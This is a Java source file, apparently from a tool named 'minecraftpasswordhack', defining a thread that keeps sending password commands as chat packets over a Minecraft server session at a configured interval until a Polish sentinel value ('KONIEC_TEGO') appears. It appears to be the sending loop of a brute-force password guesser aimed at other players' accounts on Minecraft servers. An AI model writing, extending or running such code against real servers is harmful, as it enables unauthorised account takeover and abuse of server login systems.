package xyz.minecraftpasswordhack.threads;

import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.packetlib.Session;

import xyz.minecraftpasswordhack.Main;
import xyz.minecraftpasswordhack.utils.PasswordUtil;

public class PasswordSending implements Runnable {

	private final Session session;
	
	public PasswordSending(Session session) {
		this.session = session;
	}

	@Override
	public void run() {
		while (session.isConnected()) {
			if (!PasswordUtil.getPasswordCommand().equals("KONIEC_TEGO")) {
				session.send(new ClientChatPacket(PasswordUtil.getPasswordCommand()));
				try {
					Thread.sleep(Main.getConfig().getCommandSentTime());
				} catch (InterruptedException e) {}
			}
		}
	}
}